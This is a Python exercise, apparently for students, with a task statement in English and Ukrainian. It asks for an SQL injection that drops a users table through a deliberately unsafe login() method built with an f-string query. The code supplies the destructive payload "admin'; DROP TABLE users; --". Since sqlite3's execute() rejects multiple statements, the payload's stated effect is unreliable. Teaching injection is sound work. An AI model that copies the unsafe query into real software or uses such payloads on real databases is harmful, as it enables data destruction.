"""
Another SQL Injection

There is a Python program. You need to "hack" it — write an SQL injection:
delete the users table.
Hint: call the login() method with the appropriate arguments.

Requirements:
- To achieve the goal of the task, you need to call login() with parameters
  that trigger an SQL injection.
- The SQL injection must be constructed so that it deletes the users table
  from the database.
- The arguments passed to login() must include malicious SQL code that will be
  executed in the context of the program.

  🇺🇦 Ukrainian version:

Є програма на Python. Тобі потрібно "зламати" її — написати SQL-інʼєкцію: видалити таблицю users.

Підказка: виклич метод login() з потрібними аргументами.

Вимоги:
•	Щоб досягти мети задачі, потрібно використати функцію `login()` з параметрами, які викличуть SQL-інʼєкцію.
•	SQL-інʼєкція має бути складена так, щоб видалити таблицю users з бази даних.
•	Аргументи, передані у метод `login()`, мають включати шкідливий SQL-код, що буде виконаний у контексті програми.
"""

import sqlite3

# Create an in-memory database (for this example)
# conn = sqlite3.connect(":memory:")
# cursor = conn.cursor()

# Create the users table
# cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")

# Add test data
# cursor.execute("INSERT INTO users (username, password) VALUES ('admin', '1234')")
# cursor.execute("INSERT INTO users (username, password) VALUES ('user', 'password')")
# conn.commit()


# Function that demonstrates the vulnerability
# def login(username, password):
#     query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
#     print("\n[SQL query]:", query)  # Print the query (for clarity)
#     cursor.execute(query)
#     user = cursor.fetchone()
#     if user:
#         print("✅ Login successful: ", user)
#     else:
#         print("❌ Login failed")


# Normal login (works correctly)
# login("admin", "1234")

# Close the connection
# conn.close()

import sqlite3

class DatabaseManager:
    def __init__(self):
        self.conn = sqlite3.connect(":memory:")  # Create a database in memory
        self.cursor = self.conn.cursor()
        self._create_table()
        self._insert_test_data()

    def _create_table(self):
        """Creates a users table."""
        self.cursor.execute("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY, 
                username TEXT, 
                password TEXT
            )
        """)

    def _insert_test_data(self):
        """Adds test data to the users table."""
        users = [
            ("admin", "1234"),
            ("user", "password")
        ]
        self.cursor.executemany("INSERT INTO users (username, password) VALUES (?, ?)", users)
        self.conn.commit()

    def login(self, username: str, password: str):
        """Demonstrates a vulnerability by executing an unsafe SQL query."""
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        print("\n[SQL query]:", query)  # Prints the query for demonstration purposes

        self.cursor.execute(query)
        user = self.cursor.fetchone()

        if user:
            print("✅ Login successful: ", user)
        else:
            print("❌ Login failed")

    def close_connection(self):
        """Closes the database connection."""
        self.conn.close()


# Using the class
if __name__ == "__main__":
    db = DatabaseManager()
    # db.login("admin", "unknown") # Delete the users table

    db.login("admin'; DROP TABLE users; --", "unknown") # Delete the users table
    db.close_connection()